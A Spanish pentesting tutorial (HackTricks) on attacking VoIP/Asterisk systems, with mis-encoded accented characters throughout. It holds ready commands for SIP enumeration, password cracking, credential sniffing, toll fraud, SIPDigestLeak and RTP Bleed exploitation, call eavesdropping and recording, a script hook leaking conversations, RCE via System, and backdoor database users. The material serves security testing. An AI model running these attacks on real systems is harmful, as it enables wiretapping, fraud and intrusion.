# Pentesting VoIP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## InformaciÃ³n bÃ¡sica sobre VoIP

Para comenzar a aprender cÃ³mo funciona VoIP, consulta:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## EnumeraciÃ³n de VoIP

### NÃºmeros de telÃ©fono

Uno de los primeros pasos que un equipo de Red puede hacer es buscar nÃºmeros de telÃ©fono disponibles para contactar con la empresa utilizando herramientas de OSINT, bÃºsquedas en Google o raspando las pÃ¡ginas web.

Una vez que tengas los nÃºmeros de telÃ©fono, puedes utilizar servicios en lÃ­nea para identificar el operador:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Saber si el operador proporciona servicios de VoIP te permitirÃ¡ identificar si la empresa estÃ¡ utilizando VoIP... AdemÃ¡s, es posible que la empresa no haya contratado servicios de VoIP, pero estÃ© utilizando tarjetas PSTN para conectar su propia PBX de VoIP a la red telefÃ³nica tradicional.

Cosas como respuestas automÃ¡ticas de mÃºsica generalmente indican que se estÃ¡ utilizando VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### InformaciÃ³n de OSINT

Cualquier otra enumeraciÃ³n de OSINT que ayude a identificar el software de VoIP utilizado serÃ¡ Ãºtil para un Equipo Rojo.

### EnumeraciÃ³n de la red

* **`nmap`** es capaz de escanear servicios UDP, pero debido a la cantidad de servicios UDP que se estÃ¡n escaneando, es muy lento y puede no ser muy preciso con este tipo de servicios.
* **`svmap`** de SIPVicious (`sudo apt install sipvicious`): ubicarÃ¡ los servicios SIP en la red indicada.
* `svmap` es **fÃ¡cil de bloquear** porque utiliza el User-Agent `friendly-scanner`, pero puedes modificar el cÃ³digo de `/usr/share/sipvicious/sipvicious` y cambiarlo.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Sipscan es un escÃ¡ner muy rÃ¡pido para servicios SIP sobre UDP, TCP o TLS. Utiliza multihilo y puede escanear grandes rangos de redes. Permite indicar fÃ¡cilmente un rango de puertos, escanear tanto TCP como UDP, utilizar otro mÃ©todo (por defecto utilizarÃ¡ OPTIONS) y especificar un User-Agent diferente (y mÃ¡s).
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**:

Metasploit es una herramienta de prueba de penetraciÃ³n ampliamente utilizada en el campo de la seguridad informÃ¡tica. Proporciona una plataforma para realizar pruebas de seguridad en sistemas y redes, identificando vulnerabilidades y explotÃ¡ndolas de manera controlada. Metasploit ofrece una amplia gama de mÃ³dulos y exploits que permiten a los profesionales de la seguridad evaluar la seguridad de los sistemas y aplicaciones. Es una herramienta poderosa y versÃ¡til que se utiliza tanto en pruebas de penetraciÃ³n Ã©ticas como en actividades maliciosas.
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### EnumeraciÃ³n adicional de la red

El PBX tambiÃ©n podrÃ­a estar exponiendo otros servicios de red, como:

* **69/UDP (TFTP)**: Actualizaciones de firmware
* **80 (HTTP) / 443 (HTTPS)**: Para administrar el dispositivo desde la web
* **389 (LDAP)**: Alternativa para almacenar la informaciÃ³n de los usuarios
* **3306 (MySQL)**: Base de datos MySQL
* **5038 (Manager)**: Permite utilizar Asterisk desde otras plataformas
* **5222 (XMPP)**: Mensajes utilizando Jabber
* **5432 (PostgreSQL)**: Base de datos PostgreSQL
* Y otros...

### EnumeraciÃ³n de mÃ©todos

Es posible encontrar **quÃ© mÃ©todos estÃ¡n disponibles** para usar en el PBX utilizando `sipenumerate.py` de [**sippts**](https://github.com/Pepelux/sippts)
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### EnumeraciÃ³n de extensiones

Las extensiones en un sistema de PBX (Private Branch Exchange) se refieren a los **identificadores internos Ãºnicos asignados a lÃ­neas telefÃ³nicas individuales**, dispositivos o usuarios dentro de una organizaciÃ³n o empresa. Las extensiones permiten **enrutamiento eficiente de llamadas dentro de la organizaciÃ³n**, sin la necesidad de nÃºmeros de telÃ©fono externos individuales para cada usuario o dispositivo.

* **`svwar`** de SIPVicious (`sudo apt install sipvicious`): `svwar` es un escÃ¡ner de lÃ­neas de extensiÃ³n de PBX SIP gratuito. En concepto, funciona de manera similar a los wardialers tradicionales al **adivinar un rango de extensiones o una lista dada de extensiones**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Sipexten identifica extensiones en un servidor SIP. Sipexten puede verificar grandes rangos de red y puertos.
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: TambiÃ©n puedes enumerar extensiones/nombres de usuario con metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** es un enumerador de fuerza bruta de nombres de usuario del protocolo Inter Asterisk Exchange. enumIAX puede operar en dos modos distintos; Adivinanza secuencial de nombres de usuario o Ataque de diccionario.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataques a VoIP

### Fuerza Bruta de ContraseÃ±as

Una vez descubierto el **PBX** y algunos **extensiones/nombres de usuario**, un Equipo Rojo podrÃ­a intentar **autenticarse a travÃ©s del mÃ©todo `REGISTER`** en una extensiÃ³n utilizando un diccionario de contraseÃ±as comunes para realizar un ataque de fuerza bruta.

{% hint style="danger" %}
Ten en cuenta que un **nombre de usuario** puede ser el mismo que la extensiÃ³n, pero esta prÃ¡ctica puede variar dependiendo del sistema PBX, su configuraciÃ³n y las preferencias de la organizaciÃ³n...

Si el nombre de usuario no es el mismo que la extensiÃ³n, deberÃ¡s **averiguar el nombre de usuario para realizar el ataque de fuerza bruta**.
{% endhint %}

* **`svcrack`** de SIPVicious (`sudo apt install sipvicious`): SVCrack te permite descifrar la contraseÃ±a de un nombre de usuario/extensiÃ³n especÃ­fico en un PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIP Digest Crack es una herramienta para crackear las autenticaciones de digest dentro del protocolo SIP.

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Sniffing de VoIP

Si encuentras equipos de VoIP dentro de una **red Wifi abierta**, podrÃ­as **capturar toda la informaciÃ³n**. AdemÃ¡s, si estÃ¡s dentro de una red mÃ¡s cerrada (conectada a travÃ©s de Ethernet o Wifi protegida), podrÃ­as realizar ataques de **MitM como** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) entre el **PBX y la pasarela** para capturar la informaciÃ³n.

Entre la informaciÃ³n de la red, podrÃ­as encontrar **credenciales web** para administrar el equipo, **extensiones de usuario**, **nombre de usuario**, **direcciones IP**, incluso **contraseÃ±as encriptadas** y **paquetes RTP** que podrÃ­as reproducir para **escuchar la conversaciÃ³n**, y mÃ¡s.

Para obtener esta informaciÃ³n, podrÃ­as utilizar herramientas como Wireshark, tcpdump... pero una **herramienta especialmente creada para capturar conversaciones de VoIP es** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Ten en cuenta que si se utiliza **TLS en la comunicaciÃ³n SIP**, no podrÃ¡s ver la comunicaciÃ³n SIP en claro.\
Lo mismo ocurrirÃ¡ si se utiliza **SRTP** y **ZRTP**, los **paquetes RTP no estarÃ¡n en texto claro**.
{% endhint %}

#### Credenciales SIP

[Revisa este ejemplo para entender mejor una **comunicaciÃ³n SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) para aprender cÃ³mo se envÃ­an las **credenciales**.

* **`sipdump`** y **`sipcrack`,** parte de **sipcrack** (`apt-get install sipcrack`): Estas herramientas pueden **extraer** de un **pcap** las **autenticaciones digest** dentro del protocolo SIP y **realizar ataques de fuerza bruta** sobre ellas.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark** extrae datos del protocolo SIP de un archivo PCAP.
* **SipDump** extrae autenticaciones de SIP Digest de un archivo PCAP.
* **SIP Digest Crack** es una herramienta para crackear las autenticaciones de digest dentro del protocolo SIP.
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### CÃ³digos DTMF

No solo se pueden encontrar las credenciales SIP en el trÃ¡fico de red, tambiÃ©n es posible encontrar cÃ³digos DTMF que se utilizan, por ejemplo, para acceder al buzÃ³n de voz.\
Es posible enviar estos cÃ³digos en mensajes SIP INFO, en audio o dentro de paquetes RTP. Si los cÃ³digos estÃ¡n dentro de paquetes RTP, puedes cortar esa parte de la conversaciÃ³n y usar la herramienta multimo para extraerlos:
```bash
multimon -a DTMF -t wac pin.wav
```
### Configuraciones incorrectas de llamadas gratuitas / conexiones de Asterisks

En Asterisk es posible permitir una conexiÃ³n **desde una direcciÃ³n IP especÃ­fica** o desde **cualquier direcciÃ³n IP**:
```
host=10.10.10.10
host=dynamic
```
Si se especifica una direcciÃ³n IP, el host **no necesitarÃ¡ enviar solicitudes REGISTER** de vez en cuando (en el paquete REGISTER se envÃ­a el tiempo de vida, generalmente 30 minutos, lo que significa que en otro escenario el telÃ©fono necesitarÃ¡ REGISTRARSE cada 30 minutos). Sin embargo, deberÃ¡ tener puertos abiertos que permitan conexiones desde el servidor VoIP para recibir llamadas.

Para definir usuarios, se pueden definir como:

* **`type=user`**: El usuario solo puede recibir llamadas como usuario.
* **`type=friend`**: Es posible realizar llamadas como par y recibirlas como usuario (se utiliza con extensiones).
* **`type=peer`**: Es posible enviar y recibir llamadas como par (trunk SIP).

TambiÃ©n es posible establecer confianza con la variable insegura:

* **`insecure=port`**: Permite conexiones de pares validadas por IP.
* **`insecure=invite`**: No requiere autenticaciÃ³n para mensajes INVITE.
* **`insecure=port,invite`**: Ambos.

{% hint style="warning" %}
Cuando se utiliza **`type=friend`**, el **valor** de la variable **host** **no se utilizarÃ¡**, por lo que si un administrador **configura incorrectamente un trunk SIP** utilizando ese valor, **cualquiera podrÃ¡ conectarse a Ã©l**.

Por ejemplo, esta configuraciÃ³n serÃ­a vulnerable:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Llamadas gratuitas / Configuraciones incorrectas de contexto en Asterisk

En Asterisk, un **contexto** es un contenedor o secciÃ³n con nombre en el plan de marcado que **agrupa extensiones, acciones y reglas relacionadas**. El plan de marcado es el componente principal de un sistema Asterisk, ya que define **cÃ³mo se manejan y enrutan las llamadas entrantes y salientes**. Los contextos se utilizan para organizar el plan de marcado, gestionar el control de acceso y proporcionar separaciÃ³n entre las diferentes partes del sistema.

Cada contexto se define en el archivo de configuraciÃ³n, tÃ­picamente en el archivo **`extensions.conf`**. Los contextos se indican mediante corchetes, con el nombre del contexto encerrado en ellos. Por ejemplo:
```bash
csharpCopy code[my_context]
```
Dentro del contexto, se definen extensiones (patrones de nÃºmeros marcados) y se les asocia una serie de acciones o aplicaciones. Estas acciones determinan cÃ³mo se procesa la llamada. Por ejemplo:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Este ejemplo demuestra un contexto simple llamado "mi\_contexto" con una extensiÃ³n "100". Cuando alguien marca 100, la llamada serÃ¡ contestada, se reproducirÃ¡ un mensaje de bienvenida y luego la llamada serÃ¡ terminada.

Este es **otro contexto** que permite **llamar a cualquier otro nÃºmero**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Si el administrador define el **contexto predeterminado** como:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Cualquier persona podrÃ¡ utilizar el **servidor para llamar a cualquier otro nÃºmero** (y el administrador del servidor pagarÃ¡ por la llamada).
{% endhint %}

{% hint style="danger" %}
AdemÃ¡s, por defecto el archivo **`sip.conf`** contiene **`allowguest=true`**, entonces **cualquier** atacante sin autenticaciÃ³n podrÃ¡ llamar a cualquier otro nÃºmero.
{% endhint %}

*   **`sipinvite.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Sipinvite verifica si un servidor PBX nos permite hacer llamadas sin autenticaciÃ³n. Si el servidor SIP tiene una configuraciÃ³n incorrecta, nos permitirÃ¡ hacer llamadas a nÃºmeros externos. TambiÃ©n puede permitirnos transferir la llamada a un segundo nÃºmero externo.

Por ejemplo, si tu servidor Asterisk tiene una mala configuraciÃ³n de contexto, puedes aceptar solicitudes INVITE sin autorizaciÃ³n. En este caso, un atacante puede hacer llamadas sin conocer ningÃºn usuario/contraseÃ±a.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Llamadas gratuitas / IVRS mal configurado

IVRS significa **Sistema de Respuesta de Voz Interactiva**, una tecnologÃ­a de telefonÃ­a que permite a los usuarios interactuar con un sistema informatizado a travÃ©s de comandos de voz o tonos tÃ¡ctiles. IVRS se utiliza para construir sistemas de manejo de llamadas automatizados que ofrecen una variedad de funcionalidades, como proporcionar informaciÃ³n, dirigir llamadas y capturar la entrada del usuario.

El IVRS en los sistemas VoIP generalmente consta de:

1. **Indicaciones de voz**: Mensajes de audio pregrabados que guÃ­an a los usuarios a travÃ©s de las opciones del menÃº y las instrucciones del IVR.
2. **SeÃ±alizaciÃ³n DTMF** (Dual-Tone Multi-Frequency): Entradas de tonos tÃ¡ctiles generadas al presionar teclas en el telÃ©fono, que se utilizan para navegar por los menÃºs del IVR y proporcionar informaciÃ³n.
3. **Enrutamiento de llamadas**: Dirigir las llamadas al destino adecuado, como departamentos especÃ­ficos, agentes o extensiones segÃºn la entrada del usuario.
4. **Captura de entrada del usuario**: Recopilar informaciÃ³n de los llamantes, como nÃºmeros de cuenta, IDs de casos u otros datos relevantes.
5. **IntegraciÃ³n con sistemas externos**: Conectar el sistema IVR a bases de datos u otros sistemas de software para acceder o actualizar informaciÃ³n, realizar acciones o activar eventos.

En un sistema VoIP Asterisk, puedes crear un IVR utilizando el plan de marcaciÃ³n (archivo **`extensions.conf`**) y varias aplicaciones como `Background()`, `Playback()`, `Read()`, y mÃ¡s. Estas aplicaciones te ayudan a reproducir indicaciones de voz, capturar la entrada del usuario y controlar el flujo de la llamada.

#### Ejemplo de configuraciÃ³n vulnerable
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
El ejemplo anterior muestra cÃ³mo se le pide al usuario que **presione 1 para llamar** a un departamento, **2 para llamar** a otro, o **la extensiÃ³n completa** si la conoce.\
La vulnerabilidad radica en el hecho de que **no se verifica la longitud de la extensiÃ³n indicada**, por lo que un usuario podrÃ­a ingresar un nÃºmero completo durante el tiempo de espera de 5 segundos y se realizarÃ¡ la llamada.

### InyecciÃ³n de extensiÃ³n

Usando una extensiÃ³n como:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Donde **`${EXTEN}`** es la **extensiÃ³n** que se llamarÃ¡, cuando se introduzca la **ext 101**, esto es lo que sucederÃ­a:
```scss
exten => 101,1,Dial(SIP/101)
```
Sin embargo, si **`${EXTEN}`** permite introducir **mÃ¡s que nÃºmeros** (como en versiones anteriores de Asterisk), un atacante podrÃ­a introducir **`101&SIP123123123`** para llamar al nÃºmero de telÃ©fono 123123123. Y este serÃ­a el resultado:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Por lo tanto, una llamada a la extensiÃ³n **`101`** y **`123123123`** serÃ¡ enviada y solo se establecerÃ¡ la primera que reciba la llamada... pero si un atacante utiliza una **extensiÃ³n que evita cualquier coincidencia** que se estÃ© realizando pero que no existe, podrÃ­a **inyectar una llamada solo al nÃºmero deseado**.

## SIPDigestLeak

El SIP Digest Leak es una vulnerabilidad que afecta a una gran cantidad de telÃ©fonos SIP, incluyendo tanto telÃ©fonos IP de hardware como de software, asÃ­ como adaptadores telefÃ³nicos (VoIP a analÃ³gico). La vulnerabilidad permite la **filtraciÃ³n de la respuesta de autenticaciÃ³n Digest**, que se calcula a partir de la contraseÃ±a. Un **ataque de contraseÃ±a sin conexiÃ³n es entonces posible** y puede recuperar la mayorÃ­a de las contraseÃ±as basadas en la respuesta del desafÃ­o.

Escenario de vulnerabilidad (para [**mÃ¡s informaciÃ³n consulta esto**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)):

1. Un telÃ©fono IP (vÃ­ctima) estÃ¡ escuchando en el puerto 5060, aceptando llamadas telefÃ³nicas.
2. El atacante envÃ­a un INVITE al telÃ©fono IP.
3. El telÃ©fono vÃ­ctima comienza a sonar y alguien contesta y cuelga (porque nadie responde al telÃ©fono en el otro extremo).
4. Cuando se cuelga el telÃ©fono, el **telÃ©fono vÃ­ctima envÃ­a un BYE al atacante**.
5. El atacante emite una respuesta 407 que **solicita autenticaciÃ³n** y emite un desafÃ­o de autenticaciÃ³n.
6. El **telÃ©fono vÃ­ctima proporciona una respuesta al desafÃ­o de autenticaciÃ³n** en un segundo BYE.
7. El atacante puede entonces realizar un ataque de fuerza bruta en la respuesta del desafÃ­o en su mÃ¡quina local (o en una red distribuida, etc.) y adivinar la contraseÃ±a.

* **sipdigestleak.py** de [**sippts**](https://github.com/Pepelux/sippts)**:** SipDigestLeak explota esta vulnerabilidad.
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permite a un **usuario web** (que por ejemplo puede estar interesado en un producto) **introducir** su **nÃºmero de telÃ©fono** para recibir una llamada. Luego se llamarÃ¡ a un comercial y cuando este **conteste el telÃ©fono**, el usuario serÃ¡ **llamado y conectado con el agente**.

Un perfil comÃºn de Asterisk para esto es:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* El perfil anterior permite que **CUALQUIER direcciÃ³n IP se conecte** (si se conoce la contraseÃ±a).
* Para **organizar una llamada**, como se especificÃ³ anteriormente, **no es necesario tener permisos de lectura** y solo se necesita **origen** en **escritura**.

Con esos permisos, cualquier IP que conozca la contraseÃ±a podrÃ­a conectarse y extraer demasiada informaciÃ³n, como:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Se puede solicitar mÃ¡s informaciÃ³n o acciones.**

### **Espionaje**

En Asterisk es posible utilizar el comando **`ChanSpy`** indicando la **extensiÃ³n(es) a monitorear** (o todas ellas) para escuchar las conversaciones que estÃ¡n ocurriendo. Este comando debe ser asignado a una extensiÃ³n.

Por ejemplo, **`exten => 333,1,ChanSpy('all',qb)`** indica que si **llamas** a la **extensiÃ³n 333**, se **monitorearÃ¡n** **`todas`** las extensiones, **comenzando a escuchar** cuando una nueva conversaciÃ³n comienza (**`b`**) en modo silencioso (**`q`**) ya que no queremos interactuar en ella. Puedes pasar de una conversaciÃ³n a otra presionando **`*`**, o marcando el nÃºmero de extensiÃ³n.

TambiÃ©n es posible utilizar **`ExtenSpy`** para monitorear solo una extensiÃ³n.

En lugar de escuchar las conversaciones, es posible **grabarlas en archivos** utilizando una extensiÃ³n como:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Las llamadas se guardarÃ¡n en **`/tmp`**.

Incluso podrÃ­as hacer que Asterisk **ejecute un script que filtrarÃ¡ la llamada** cuando se cierre.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed** es un importante problema de seguridad que afecta a los servidores VoIP basados en Asterisk (publicado en 2017). La vulnerabilidad permite que el trÃ¡fico de **RTP (Protocolo de Tiempo Real)**, que lleva las conversaciones VoIP, sea **interceptado y redirigido por cualquier persona en Internet**. Esto ocurre porque el trÃ¡fico de RTP evita la autenticaciÃ³n al atravesar los firewalls de NAT (TraducciÃ³n de Direcciones de Red).

Los proxies de RTP intentan solucionar las **limitaciones de NAT** que afectan a los sistemas RTC al actuar como intermediarios en los flujos de RTP entre dos o mÃ¡s partes. Cuando hay NAT, el software del proxy de RTP a menudo no puede confiar en la informaciÃ³n de IP y puerto de RTP obtenida a travÃ©s de la seÃ±alizaciÃ³n (por ejemplo, SIP). Por lo tanto, varios proxies de RTP han implementado un mecanismo donde esta **tupla de IP y puerto se aprende automÃ¡ticamente**. Esto se hace a menudo inspeccionando el trÃ¡fico de RTP entrante y marcando la IP y puerto de origen de cualquier trÃ¡fico de RTP entrante como aquellos a los que se debe responder. Este mecanismo, que puede llamarse "modo de aprendizaje", **no utiliza ningÃºn tipo de autenticaciÃ³n**. Por lo tanto, los **atacantes** pueden **enviar trÃ¡fico de RTP al proxy de RTP** y recibir el trÃ¡fico de RTP proxy destinado al llamante o al receptor de un flujo de RTP en curso. Llamamos a esta vulnerabilidad RTP Bleed porque permite a los atacantes recibir flujos de medios RTP destinados a usuarios legÃ­timos.

Otro comportamiento interesante de los proxies de RTP y las pilas de RTP es que a veces, **incluso si no son vulnerables a RTP Bleed**, aceptarÃ¡n, reenviarÃ¡n y/o procesarÃ¡n paquetes de RTP de cualquier origen. Por lo tanto, los atacantes pueden enviar paquetes de RTP que les permitan inyectar sus propios medios en lugar de los legÃ­timos. Llamamos a este ataque RTP injection porque permite la inyecciÃ³n de paquetes de RTP ilegÃ­timos en flujos de RTP existentes. Esta vulnerabilidad puede encontrarse tanto en proxies de RTP como en puntos finales.

Asterisk y FreePBX tradicionalmente han utilizado la configuraciÃ³n **`NAT=yes`**, que permite que el trÃ¡fico de RTP evite la autenticaciÃ³n, lo que puede provocar que no haya audio o que el audio sea unidireccional en las llamadas.

Para obtener mÃ¡s informaciÃ³n, consulta [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`rtpbleed.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Detecta la vulnerabilidad de RTP Bleed enviando flujos de RTP.
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Detecta la vulnerabilidad de RTP Bleed enviando flujos RTP.
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Explota la vulnerabilidad de RTP Bleed enviando flujos de RTP
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Explota la vulnerabilidad de RTP Bleed enviando flujos de RTP (desde un archivo de audio)
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE (EjecuciÃ³n Remota de CÃ³digo)

En Asterisk, de alguna manera logras ser capaz de **agregar reglas de extensiÃ³n y recargarlas** (por ejemplo, comprometiendo un servidor de administraciÃ³n web vulnerable), es posible obtener RCE utilizando el comando **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Existe un comando llamado **`Shell`** que se puede utilizar **en lugar de `System`** para ejecutar comandos del sistema si es necesario.

{% hint style="warning" %}
Si el servidor **prohÃ­be el uso de ciertos caracteres** en el comando **`System`** (como en Elastix), verifica si el servidor web permite **crear archivos de alguna manera dentro del sistema** (como en Elastix o trixbox) y Ãºsalo para **crear un script de puerta trasera** y luego utiliza **`System`** para **ejecutar** ese **script**.
{% endhint %}

#### Archivos locales interesantes y permisos

* **`sip.conf`** -> Contiene la contraseÃ±a de los usuarios SIP.
* Si el servidor de Asterisk se estÃ¡ ejecutando como root, podrÃ­as comprometer el root.
* El usuario root de **mysql** podrÃ­a **no tener contraseÃ±a**.
* Esto se podrÃ­a utilizar para crear un nuevo usuario de mysql como puerta trasera.
* **`FreePBX`**
* **`amportal.conf`** -> Contiene la contraseÃ±a del administrador del panel web (FreePBX).
* **`FreePBX.conf`** -> Contiene la contraseÃ±a del usuario FreePBXuser utilizado para acceder a la base de datos.
* Esto se podrÃ­a utilizar para crear un nuevo usuario de mysql como puerta trasera.
* **`Elastix`**
* **`Elastix.conf`** -> Contiene varias contraseÃ±as en texto claro, como la contraseÃ±a de root de mysql, la contraseÃ±a de IMAPd y la contraseÃ±a del administrador web.
